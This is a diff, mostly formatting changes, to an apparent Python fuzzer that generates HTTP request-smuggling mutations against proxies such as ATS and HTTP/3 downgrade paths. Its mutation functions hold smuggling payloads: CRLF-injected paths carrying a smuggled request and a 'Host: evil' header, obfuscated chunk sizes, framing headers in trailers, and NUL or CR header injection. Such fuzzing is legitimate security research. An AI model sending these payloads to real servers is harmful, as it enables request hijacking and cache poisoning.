@@ -351,6 +351,7 @@ def _mut_bare_lf_chunk(g: Genome, rng: random.Random) -> Genome:
     three terminators (after chunk data, after the 0-size, the final blank line) is
     independently CRLF or bare LF, so the search can place the malformation and let
     the oracle keep only the placement that actually flips behaviour."""
+
     def term() -> bytes:
         return rng.choice((b"\r\n", b"\n"))
 
@@ -381,7 +382,9 @@ def _chunk_replace(g: Genome, body: bytes) -> Genome:
     for i, o in enumerate(g):
         if isinstance(o, Headers):
             if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
-                g[i] = replace(o, fields=o.fields + ((b"transfer-encoding", b"chunked"),))
+                g[i] = replace(
+                    o, fields=o.fields + ((b"transfer-encoding", b"chunked"),)
+                )
             break
     g.append(Data(body, end_stream=True))
     return g
@@ -394,7 +397,7 @@ def _mut_chunk_ext(g: Genome, rng: random.Random) -> Genome:
     ATS's output while every raw pair looked clean."""
     size = rng.choice((5, 0x10, 0x20))
     data = bytes(rng.randrange(65, 91) for _ in range(size))
-    ext = rng.choice((b";a=b", b";x", b";" + b"a" * 8 + b"=" + b"b" * 8, b";a=\"q\""))
+    ext = rng.choice((b";a=b", b";x", b";" + b"a" * 8 + b"=" + b"b" * 8, b';a="q"'))
     where = rng.choice(("size", "zero", "both"))
     sz = (b"%x" % size) + (ext if where in ("size", "both") else b"")
     zero = b"0" + (ext if where in ("zero", "both") else b"")
@@ -408,12 +411,14 @@ def _mut_chunk_size_obfuscate(g: Genome, rng: random.Random) -> Genome:
     boundary. ATS forwards these verbatim."""
     size = rng.choice((5, 0x10, 0x1F))
     hexs = b"%x" % size
-    tok = rng.choice((
-        b"0" * rng.randint(1, 4) + hexs,          # leading zeros
-        hexs + rng.choice((b" ", b"\t", b"  ")),  # trailing whitespace
-        b"0x" + hexs,                              # 0x prefix
-        b"+" + hexs,                               # + prefix
-    ))
+    tok = rng.choice(
+        (
+            b"0" * rng.randint(1, 4) + hexs,  # leading zeros
+            hexs + rng.choice((b" ", b"\t", b"  ")),  # trailing whitespace
+            b"0x" + hexs,  # 0x prefix
+            b"+" + hexs,  # + prefix
+        )
+    )
     data = bytes(rng.randrange(65, 91) for _ in range(size))
     body = b"%s\r\n%s\r\n0\r\n\r\n" % (tok, data)
     return _chunk_replace(g, body)
@@ -425,11 +430,13 @@ def _mut_chunk_trailer(g: Genome, rng: random.Random) -> Genome:
     a framing header smuggled in the trailer is the payload."""
     size = rng.choice((5, 0x10))
     data = bytes(rng.randrange(65, 91) for _ in range(size))
-    trailer = rng.choice((
-        b"X-T: y",
-        b"Transfer-Encoding: chunked",
-        b"Content-Length: 0",
-    ))
+    trailer = rng.choice(
+        (
+            b"X-T: y",
+            b"Transfer-Encoding: chunked",
+            b"Content-Length: 0",
+        )
+    )
     body = b"%x\r\n%s\r\n0\r\n%s\r\n\r\n" % (size, data, trailer)
     return _chunk_replace(g, body)
 
@@ -531,8 +538,7 @@ def _mut_rl_space(g: Genome, rng: random.Random) -> Genome:
     for i, o in enumerate(g):
         if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
             fields = tuple(
-                (k, v + ws) if k.lower() == b":method" else (k, v)
-                for k, v in o.fields
+                (k, v + ws) if k.lower() == b":method" else (k, v) for k, v in o.fields
             )
             g[i] = replace(o, fields=fields)
             return g
@@ -575,16 +581,33 @@ def _h3_set_cl(g: Genome, n: int) -> Genome:
     out, found = [], False
     for o in g:
         if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
-            fields = tuple((k, v) for k, v in o.fields if k.lower() != b"content-length")
-            out.append(replace(o, fields=fields + ((b"content-length", str(n).encode()),),
-                               end_stream=False))
+            fields = tuple(
+                (k, v) for k, v in o.fields if k.lower() != b"content-length"
+            )
+            out.append(
+                replace(
+                    o,
+                    fields=fields + ((b"content-length", str(n).encode()),),
+                    end_stream=False,
+                )
+            )
             found = True
         else:
             out.append(o)
     if not found:
-        out.insert(0, Headers(((b":method", b"POST"), (b":scheme", b"https"),
-                               (b":authority", b"lab"), (b":path", b"/"),
-                               (b"content-length", str(n).encode())), end_stream=False))
+        out.insert(
+            0,
+            Headers(
+                (
+                    (b":method", b"POST"),
+                    (b":scheme", b"https"),
+                    (b":authority", b"lab"),
+                    (b":path", b"/"),
+                    (b"content-length", str(n).encode()),
+                ),
+                end_stream=False,
+            ),
+        )
     return out
 
 
@@ -640,7 +663,9 @@ def _mut_pseudo_path_space(g: Genome, rng: random.Random) -> Genome:
     g = list(g)
     for i, o in enumerate(g):
         if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
-            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
+            fields = tuple(
+                (k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields
+            )
             g[i] = replace(o, fields=fields)
             return g
     return g
@@ -651,16 +676,20 @@ def _mut_h3_reqline_inject(g: Genome, rng: random.Random) -> Genome:
     splices verbatim into the H1 request line (:path / :method carrying CR/LF and a
     smuggled request or header). Only reaches the wire over the raw QPACK path
     (aioquic rejects it); a downgrade that does not sanitize splices it into H1."""
-    inj = rng.choice((
-        b"/ HTTP/1.1\r\nHost: evil\r\nX-Smuggled: 1",
-        b"/x\r\nTransfer-Encoding: chunked",
-        b"/x\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: y",
-        b"/x\r\nContent-Length: 0",
-    ))
+    inj = rng.choice(
+        (
+            b"/ HTTP/1.1\r\nHost: evil\r\nX-Smuggled: 1",
+            b"/x\r\nTransfer-Encoding: chunked",
+            b"/x\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: y",
+            b"/x\r\nContent-Length: 0",
+        )
+    )
     g = list(g)
     for i, o in enumerate(g):
         if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
-            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
+            fields = tuple(
+                (k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields
+            )
             g[i] = replace(o, fields=fields)
             return g
     return g
@@ -670,10 +699,16 @@ def _mut_h3_pseudo_dup(g: Genome, rng: random.Random) -> Genome:
     """Duplicate/conflicting pseudo-header (:method, :path, or :authority) or a value
     with a bare CR/LF/NUL. RFC 9114 forbids these; the raw QPACK path sends them so a
     downgrade that fails to reject picks one value while the backend sees another."""
-    inj = rng.choice((
-        (b":path", b"/b"), (b":method", b"POST"), (b":authority", b"evil"),
-        (b"x-inj", b"1\rEvil: 2"), (b"x-inj", b"1\nEvil: 2"), (b"x-inj", b"1\x00Evil"),
-    ))
+    inj = rng.choice(
+        (
+            (b":path", b"/b"),
+            (b":method", b"POST"),
+            (b":authority", b"evil"),
+            (b"x-inj", b"1\rEvil: 2"),
+            (b"x-inj", b"1\nEvil: 2"),
+            (b"x-inj", b"1\x00Evil"),
+        )
+    )
     g = list(g)
     for i, o in enumerate(g):
         if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
@@ -685,9 +720,13 @@ def _mut_h3_pseudo_dup(g: Genome, rng: random.Random) -> Genome:
 # H3-downgrade genes usable as a biased subset for the H3 hunt. The reqline/pseudo
 # injection genes need the raw QPACK driver path (raw=True) to reach the wire.
 H3_OPERATOR_NAMES = (
-    "_mut_standalone_fin", "_mut_body_length_lie", "_mut_reset_mid_body",
-    "_mut_authority_host_conflict", "_mut_pseudo_path_space",
-    "_mut_h3_reqline_inject", "_mut_h3_pseudo_dup",
+    "_mut_standalone_fin",
+    "_mut_body_length_lie",
+    "_mut_reset_mid_body",
+    "_mut_authority_host_conflict",
+    "_mut_pseudo_path_space",
+    "_mut_h3_reqline_inject",
+    "_mut_h3_pseudo_dup",
 )
 
 
